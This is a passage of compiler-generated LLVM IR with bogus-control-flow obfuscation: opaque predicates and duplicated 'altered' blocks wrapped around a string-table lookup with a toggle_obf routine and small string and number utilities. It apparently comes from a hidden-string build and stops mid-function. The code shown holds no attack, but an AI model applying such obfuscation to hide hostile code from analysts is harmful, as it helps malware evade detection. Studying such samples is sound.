; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = load i32, i32* @x.85
  %3 = load i32, i32* @y.86
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8, align 1
  %11 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %10, align 1
  %12 = load i8, i8* %10, align 1
  %13 = zext i8 %12 to i64
  %14 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %13
  store %struct.table_value* %14, %struct.table_value** %11, align 8
  %15 = load i8, i8* %10, align 1
  call void @toggle_obf(i8 zeroext %15)
  %16 = load i32, i32* @x.85
  %17 = load i32, i32* @y.86
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %24 = alloca i8, align 1
  %25 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %24, align 1
  %26 = load i8, i8* %24, align 1
  %27 = zext i8 %26 to i64
  %28 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %27
  store %struct.table_value* %28, %struct.table_value** %25, align 8
  %29 = load i8, i8* %24, align 1
  call void @toggle_obf(i8 zeroext %29)
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %33

; <label>:11:                                     ; preds = %2
  %12 = load i32, i32* @x.87
  %13 = load i32, i32* @y.88
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %11
  %20 = load %struct.table_value*, %struct.table_value** %5, align 8
  %21 = getelementptr inbounds %struct.table_value, %struct.table_value* %20, i32 0, i32 1
  %22 = load i16, i16* %21, align 8
  %23 = zext i16 %22 to i32
  %24 = load i32*, i32** %4, align 8
  store i32 %23, i32* %24, align 4
  %25 = load i32, i32* @x.87
  %26 = load i32, i32* @y.88
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %33

; <label>:33:                                     ; preds = %originalBBpart2, %2
  %34 = load %struct.table_value*, %struct.table_value** %5, align 8
  %35 = getelementptr inbounds %struct.table_value, %struct.table_value* %34, i32 0, i32 0
  %36 = load i8*, i8** %35, align 8
  ret i8* %36

originalBBalteredBB:                              ; preds = %originalBB, %11
  %37 = load %struct.table_value*, %struct.table_value** %5, align 8
  %38 = getelementptr inbounds %struct.table_value, %struct.table_value* %37, i32 0, i32 1
  %39 = load i16, i16* %38, align 8
  %40 = zext i16 %39 to i32
  %41 = load i32*, i32** %4, align 8
  store i32 %40, i32* %41, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strlen(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  br label %4

; <label>:4:                                      ; preds = %10, %1
  %5 = load i8*, i8** %2, align 8
  %6 = getelementptr inbounds i8, i8* %5, i32 1
  store i8* %6, i8** %2, align 8
  %7 = load i8, i8* %5, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp ne i32 %8, 0
  br i1 %9, label %10, label %13

; <label>:10:                                     ; preds = %4
  %11 = load i32, i32* %3, align 4
  %12 = add nsw i32 %11, 1
  store i32 %12, i32* %3, align 4
  br label %4

; <label>:13:                                     ; preds = %4
  %14 = load i32, i32* @x.89
  %15 = load i32, i32* @y.90
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %13
  %22 = load i32, i32* %3, align 4
  %23 = load i32, i32* @x.89
  %24 = load i32, i32* @y.90
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %22

originalBBalteredBB:                              ; preds = %originalBB, %13
  %31 = load i32, i32* %3, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @util_memcpy(i8*, i8*, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %9 = load i8*, i8** %4, align 8
  store i8* %9, i8** %7, align 8
  %10 = load i8*, i8** %5, align 8
  store i8* %10, i8** %8, align 8
  br label %11

; <label>:11:                                     ; preds = %15, %3
  %12 = load i32, i32* %6, align 4
  %13 = add nsw i32 %12, -1
  store i32 %13, i32* %6, align 4
  %14 = icmp ne i32 %12, 0
  br i1 %14, label %15, label %21

; <label>:15:                                     ; preds = %11
  %16 = load i8*, i8** %8, align 8
  %17 = getelementptr inbounds i8, i8* %16, i32 1
  store i8* %17, i8** %8, align 8
  %18 = load i8, i8* %16, align 1
  %19 = load i8*, i8** %7, align 8
  %20 = getelementptr inbounds i8, i8* %19, i32 1
  store i8* %20, i8** %7, align 8
  store i8 %18, i8* %19, align 1
  br label %11

; <label>:21:                                     ; preds = %11
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @util_zero(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load i8*, i8** %3, align 8
  store i8* %6, i8** %5, align 8
  br label %7

; <label>:7:                                      ; preds = %11, %2
  %8 = load i32, i32* %4, align 4
  %9 = add nsw i32 %8, -1
  store i32 %9, i32* %4, align 4
  %10 = icmp ne i32 %8, 0
  br i1 %10, label %11, label %14

; <label>:11:                                     ; preds = %7
  %12 = load i8*, i8** %5, align 8
  %13 = getelementptr inbounds i8, i8* %12, i32 1
  store i8* %13, i8** %5, align 8
  store i8 0, i8* %12, align 1
  br label %7

; <label>:14:                                     ; preds = %7
  %15 = load i32, i32* @x.93
  %16 = load i32, i32* @y.94
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %14
  %23 = load i32, i32* @x.93
  %24 = load i32, i32* @y.94
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %14
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_atoi(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i32 0, i32* %8, align 4
  br label %11

; <label>:11:                                     ; preds = %32, %2
  %12 = load i32, i32* @x.95
  %13 = load i32, i32* @y.96
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %11
  %20 = load i8*, i8** %3, align 8
  %21 = getelementptr inbounds i8, i8* %20, i32 1
  store i8* %21, i8** %3, align 8
  %22 = load i8, i8* %20, align 1
  %23 = sext i8 %22 to i32
  store i32 %23, i32* %6, align 4
  %24 = load i32, i32* @x.95
  %25 = load i32, i32* @y.96
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %32

; <label>:32:                                     ; preds = %originalBBpart2
  %33 = load i32, i32* %6, align 4
  %34 = trunc i32 %33 to i8
  %35 = call i32 @util_isspace(i8 signext %34)
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %11, label %37

; <label>:37:                                     ; preds = %32
  %38 = load i32, i32* @x.95
  %39 = load i32, i32* @y.96
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %37
  %46 = load i32, i32* %6, align 4
  %47 = icmp eq i32 %46, 45
  %48 = load i32, i32* @x.95
  %49 = load i32, i32* @y.96
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %47, label %56, label %61

; <label>:56:                                     ; preds = %originalBBpart24
  store i32 1, i32* %8, align 4
  %57 = load i8*, i8** %3, align 8
  %58 = getelementptr inbounds i8, i8* %57, i32 1
  store i8* %58, i8** %3, align 8
  %59 = load i8, i8* %57, align 1
  %60 = sext i8 %59 to i32
  store i32 %60, i32* %6, align 4
  br label %70

; <label>:61:                                     ; preds = %originalBBpart24
  %62 = load i32, i32* %6, align 4
  %63 = icmp eq i32 %62, 43
  br i1 %63, label %64, label %69

; <label>:64:                                     ; preds = %61
  %65 = load i8*, i8** %3, align 8
  %66 = getelementptr inbounds i8, i8* %65, i32 1
  store i8* %66, i8** %3, align 8
  %67 = load i8, i8* %65, align 1
  %68 = sext i8 %67 to i32
  store i32 %68, i32* %6, align 4
  br label %69

; <label>:69:                                     ; preds = %64, %61
  br label %70

; <label>:70:                                     ; preds = %69, %56
  %71 = load i32, i32* %8, align 4
  %72 = icmp ne i32 %71, 0
  %73 = select i1 %72, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %73, i64* %7, align 8
  %74 = load i64, i64* %7, align 8
  %75 = load i32, i32* %4, align 4
  %76 = sext i32 %75 to i64
  %77 = urem i64 %74, %76
  %78 = trunc i64 %77 to i32
  store i32 %78, i32* %10, align 4
  %79 = load i32, i32* %4, align 4
  %80 = sext i32 %79 to i64
  %81 = load i64, i64* %7, align 8
  %82 = udiv i64 %81, %80
  store i64 %82, i64* %7, align 8
  store i64 0, i64* %5, align 8
  store i32 0, i32* %9, align 4
  br label %83

; <label>:83:                                     ; preds = %201, %70
  %84 = load i32, i32* %6, align 4
  %85 = trunc i32 %84 to i8
  %86 = call i32 @util_isdigit(i8 signext %85)
  %87 = icmp ne i32 %86, 0
  br i1 %87, label %88, label %91

; <label>:88:                                     ; preds = %83
  %89 = load i32, i32* %6, align 4
  %90 = sub nsw i32 %89, 48
  store i32 %90, i32* %6, align 4
  br label %138

; <label>:91:                                     ; preds = %83
  %92 = load i32, i32* @x.95
  %93 = load i32, i32* @y.96
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %91
  %100 = load i32, i32* %6, align 4
  %101 = trunc i32 %100 to i8
  %102 = call i32 @util_isalpha(i8 signext %101)
  %103 = icmp ne i32 %102, 0
  %104 = load i32, i32* @x.95
  %105 = load i32, i32* @y.96
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %103, label %112, label %120

; <label>:112:                                    ; preds = %originalBBpart28
  %113 = load i32, i32* %6, align 4
  %114 = trunc i32 %113 to i8
  %115 = call i32 @util_isupper(i8 signext %114)
  %116 = icmp ne i32 %115, 0
  %117 = select i1 %116, i32 55, i32 87
  %118 = load i32, i32* %6, align 4
  %119 = sub nsw i32 %118, %117
  store i32 %119, i32* %6, align 4
  br label %121

; <label>:120:                                    ; preds = %originalBBpart28
  br label %206

; <label>:121:                                    ; preds = %112
  %122 = load i32, i32* @x.95
  %123 = load i32, i32* @y.96
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %121
  %130 = load i32, i32* @x.95
  %131 = load i32, i32* @y.96
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %138

; <label>:138:                                    ; preds = %originalBBpart212, %88
  %139 = load i32, i32* %6, align 4
  %140 = load i32, i32* %4, align 4
  %141 = icmp sge i32 %139, %140
  br i1 %141, label %142, label %159

; <label>:142:                                    ; preds = %138
  %143 = load i32, i32* @x.95
  %144 = load i32, i32* @y.96
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %142
  %151 = load i32, i32* @x.95
  %152 = load i32, i32* @y.96
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %206

; <label>:159:                                    ; preds = %138
  %160 = load i32, i32* %9, align 4
  %161 = icmp slt i32 %160, 0
  br i1 %161, label %190, label %162

; <label>:162:                                    ; preds = %159
  %163 = load i64, i64* %5, align 8
  %164 = load i64, i64* %7, align 8
  %165 = icmp ugt i64 %163, %164
  br i1 %165, label %190, label %166

; <label>:166:                                    ; preds = %162
  %167 = load i64, i64* %5, align 8
  %168 = load i64, i64* %7, align 8
  %169 = icmp eq i64 %167, %168
  br i1 %169, label %170, label %191

; <label>:170:                                    ; preds = %166
  %171 = load i32, i32* @x.95
  %172 = load i32, i32* @y.96
  %173 = sub i32 %171, 1
  %174 = mul i32 %171, %173
  %175 = urem i32 %174, 2
  %176 = icmp eq i32 %175, 0
  %177 = icmp slt i32 %172, 10
  %178 = or i1 %176, %177
  br i1 %178, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %170
  %179 = load i32, i32* %6, align 4
  %180 = load i32, i32* %10, align 4
  %181 = icmp sgt i32 %179, %180
  %182 = load i32, i32* @x.95
  %183 = load i32, i32* @y.96
  %184 = sub i32 %182, 1
  %185 = mul i32 %182, %184
  %186 = urem i32 %185, 2
  %187 = icmp eq i32 %186, 0
  %188 = icmp slt i32 %183, 10
  %189 = or i1 %187, %188
  br i1 %189, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %181, label %190, label %191

; <label>:190:                                    ; preds = %originalBBpart220, %162, %159
  store i32 -1, i32* %9, align 4
  br label %200

; <label>:191:                                    ; preds = %originalBBpart220, %166
  store i32 1, i32* %9, align 4
  %192 = load i32, i32* %4, align 4
  %193 = sext i32 %192 to i64
  %194 = load i64, i64* %5, align 8
  %195 = mul i64 %194, %193
  store i64 %195, i64* %5, align 8
  %196 = load i32, i32* %6, align 4
  %197 = sext i32 %196 to i64
  %198 = load i64, i64* %5, align 8
  %199 = add i64 %198, %197
  store i64 %199, i64* %5, align 8
  br label %200

; <label>:200:                                    ; preds = %191, %190
  br label %201

; <label>:201:                                    ; preds = %200
  %202 = load i8*, i8** %3, align 8
  %203 = getelementptr inbounds i8, i8* %202, i32 1
  store i8* %203, i8** %3, align 8
  %204 = load i8, i8* %202, align 1
  %205 = sext i8 %204 to i32
  store i32 %205, i32* %6, align 4
  br label %83

; <label>:206:                                    ; preds = %originalBBpart216, %120
  %207 = load i32, i32* @x.95
  %208 = load i32, i32* @y.96
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %206
  %215 = load i32, i32* %9, align 4
  %216 = icmp slt i32 %215, 0
  %217 = load i32, i32* @x.95
  %218 = load i32, i32* @y.96
  %219 = sub i32 %217, 1
  %220 = mul i32 %217, %219
  %221 = urem i32 %220, 2
  %222 = icmp eq i32 %221, 0
  %223 = icmp slt i32 %218, 10
  %224 = or i1 %222, %223
  br i1 %224, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %216, label %225, label %229

; <label>:225:                                    ; preds = %originalBBpart224
  %226 = load i32, i32* %8, align 4
  %227 = icmp ne i32 %226, 0
  %228 = select i1 %227, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %228, i64* %5, align 8
  br label %252

; <label>:229:                                    ; preds = %originalBBpart224
  %230 = load i32, i32* %8, align 4
  %231 = icmp ne i32 %230, 0
  br i1 %231, label %232, label %251

; <label>:232:                                    ; preds = %229
  %233 = load i32, i32* @x.95
  %234 = load i32, i32* @y.96
  %235 = sub i32 %233, 1
  %236 = mul i32 %233, %235
  %237 = urem i32 %236, 2
  %238 = icmp eq i32 %237, 0
  %239 = icmp slt i32 %234, 10
  %240 = or i1 %238, %239
  br i1 %240, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %232
  %241 = load i64, i64* %5, align 8
  %242 = sub i64 0, %241
  store i64 %242, i64* %5, align 8
  %243 = load i32, i32* @x.95
  %244 = load i32, i32* @y.96
  %245 = sub i32 %243, 1
  %246 = mul i32 %243, %245
  %247 = urem i32 %246, 2
  %248 = icmp eq i32 %247, 0
  %249 = icmp slt i32 %244, 10
  %250 = or i1 %248, %249
  br i1 %250, label %originalBBpart237, label %originalBB26alteredBB

originalBBpart237:                                ; preds = %originalBB26
  br label %251

; <label>:251:                                    ; preds = %originalBBpart237, %229
  br label %252

; <label>:252:                                    ; preds = %251, %225
  %253 = load i64, i64* %5, align 8
  %254 = trunc i64 %253 to i32
  ret i32 %254

originalBBalteredBB:                              ; preds = %originalBB, %11
  %255 = load i8*, i8** %3, align 8
  %256 = getelementptr inbounds i8, i8* %255, i32 1
  store i8* %256, i8** %3, align 8
  %257 = load i8, i8* %255, align 1
  %258 = sext i8 %257 to i32
  store i32 %258, i32* %6, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %37
  %259 = load i32, i32* %6, align 4
  %260 = icmp eq i32 %259, 45
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %91
  %261 = load i32, i32* %6, align 4
  %262 = trunc i32 %261 to i8
  %263 = call i32 @util_isalpha(i8 signext %262)
  %264 = icmp ne i32 %263, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %121
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %142
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %170
  %265 = load i32, i32* %6, align 4
  %266 = load i32, i32* %10, align 4
  %267 = icmp sgt i32 %265, %266
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %206
  %268 = load i32, i32* %9, align 4
  %269 = icmp slt i32 %268, 0
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %232
  %270 = load i64, i64* %5, align 8
  %_ = sub i64 0, 0
  %gen = add i64 %_, %270
  %_27 = sub i64 0, %270
  %gen28 = mul i64 %_27, %270
  %_29 = sub i64 0, %270
  %gen30 = mul i64 %_29, %270
  %_31 = sub i64 0, 0
  %gen32 = add i64 %_31, %270
  %_33 = sub i64 0, 0
  %gen34 = add i64 %_33, %270
  %_35 = shl i64 0, %270
  %271 = sub i64 0, %270
  store i64 %271, i64* %5, align 8
  br label %originalBB26
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isspace(i8 signext) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp eq i32 %4, 32
  br i1 %5, label %50, label %6

; <label>:6:                                      ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp eq i32 %8, 9
  br i1 %9, label %50, label %10

; <label>:10:                                     ; preds = %6
  %11 = load i32, i32* @x.97
  %12 = load i32, i32* @y.98
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load i8, i8* %2, align 1
  %20 = sext i8 %19 to i32
  %21 = icmp eq i32 %20, 10
  %22 = load i32, i32* @x.97
  %23 = load i32, i32* @y.98
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %21, label %50, label %30

; <label>:30:                                     ; preds = %originalBBpart2
  %31 = load i32, i32* @x.97
  %32 = load i32, i32* @y.98
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %30
  %39 = load i8, i8* %2, align 1
  %40 = sext i8 %39 to i32
  %41 = icmp eq i32 %40, 10
  %42 = load i32, i32* @x.97
  %43 = load i32, i32* @y.98
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %50

; <label>:50:                                     ; preds = %originalBBpart24, %originalBBpart2, %6, %1
  %51 = phi i1 [ true, %originalBBpart2 ], [ true, %6 ], [ true, %1 ], [ %41, %originalBBpart24 ]
  %52 = load i32, i32* @x.97
  %53 = load i32, i32* @y.98
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %50
  %60 = zext i1 %51 to i32
  %61 = load i32, i32* @x.97
  %62 = load i32, i32* @y.98
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i32 %60

originalBBalteredBB:                              ; preds = %originalBB, %10
  %69 = load i8, i8* %2, align 1
  %70 = sext i8 %69 to i32
  %71 = icmp eq i32 %70, 10
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %30
  %72 = load i8, i8* %2, align 1
  %73 = sext i8 %72 to i32
  %74 = icmp eq i32 %73, 10
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %50
  %75 = zext i1 %51 to i32
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isdigit(i8 signext) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 48
  br i1 %5, label %6, label %26

; <label>:6:                                      ; preds = %1
  %7 = load i32, i32* @x.99
  %8 = load i32, i32* @y.100
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = load i8, i8* %2, align 1
  %16 = sext i8 %15 to i32
  %17 = icmp sle i32 %16, 57
  %18 = load i32, i32* @x.99
  %19 = load i32, i32* @y.100
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart2, %1
  %27 = phi i1 [ false, %1 ], [ %17, %originalBBpart2 ]
  %28 = zext i1 %27 to i32
  ret i32 %28

originalBBalteredBB:                              ; preds = %originalBB, %6
  %29 = load i8, i8* %2, align 1
  %30 = sext i8 %29 to i32
  %31 = icmp sle i32 %30, 57
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isalpha(i8 signext) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 65
  br i1 %5, label %6, label %10

; <label>:6:                                      ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp sle i32 %8, 90
  br i1 %9, label %20, label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = load i8, i8* %2, align 1
  %12 = sext i8 %11 to i32
  %13 = icmp sge i32 %12, 97
  br i1 %13, label %14, label %18

; <label>:14:                                     ; preds = %10
  %15 = load i8, i8* %2, align 1
  %16 = sext i8 %15 to i32
  %17 = icmp sle i32 %16, 122
  br label %18

; <label>:18:                                     ; preds = %14, %10
  %19 = phi i1 [ false, %10 ], [ %17, %14 ]
  br label %20

; <label>:20:                                     ; preds = %18, %6
  %21 = phi i1 [ true, %6 ], [ %19, %18 ]
  %22 = zext i1 %21 to i32
  ret i32 %22
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isupper(i8 signext) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 65
  br i1 %5, label %6, label %10

; <label>:6:                                      ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp sle i32 %8, 90
  br label %10

; <label>:10:                                     ; preds = %6, %1
